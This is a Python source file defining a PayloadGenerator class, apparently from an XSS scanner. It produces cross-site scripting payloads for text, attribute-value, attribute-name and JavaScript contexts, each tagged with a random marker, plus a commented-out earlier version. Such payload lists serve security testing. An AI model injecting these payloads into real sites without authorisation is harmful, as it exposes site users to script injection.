# class PayloadGenerator:

#     def __init__(self, contexts):
#         self.contexts = contexts

#     def get_payloads(self):
#         payloads = []

#         if "text" in self.contexts:
#             payloads += [
#                 "<script>alert(1)</script>",
#                 "XSS\"><script>alert(2)</script>"
#             ]

#         if "attr-value" in self.contexts:
#             payloads += [
#                 "\" autofocus onfocus=alert(3) x=\"",
#                 "' onmouseover=alert(4) '"
#             ]

#         if "attr-name" in self.contexts:
#             payloads += [
#                 "onload=alert(5)",
#                 "onclick=alert(6)"
#             ]

#         if "js" in self.contexts:
#             payloads += [
#                 "';alert(7);//",
#                 "\";alert(8);//"
#             ]

#         return payloads


# core/payload_generator.py
import random
import string

class PayloadGenerator:
    def __init__(self, contexts=None, marker_length=6):
        self.contexts = contexts or ["text", "attr-value", "attr-name", "js"]
        self.marker_length = marker_length

    def _marker(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=self.marker_length))

    def get_payloads(self):
        m = self._marker()
        payloads = []

        if "text" in self.contexts:
            payloads += [
                f"<script>/*{m}*/alert(1)</script>",
                f"XSS\"> <b>{m}</b><script>alert(2)</script>"
            ]

        if "attr-value" in self.contexts:
            payloads += [
                f"\" autofocus onfocus=alert(3) x=\"{m}",
                f"' onmouseover=alert(4) '{m}"
            ]

        if "attr-name" in self.contexts:
            payloads += [
                f"onerror=alert(5){m}",
                f"onclick=alert(6){m}"
            ]

        if "js" in self.contexts:
            payloads += [
                f"';alert(7);//{m}",
                f'";alert(8);//{m}'
            ]

        return payloads
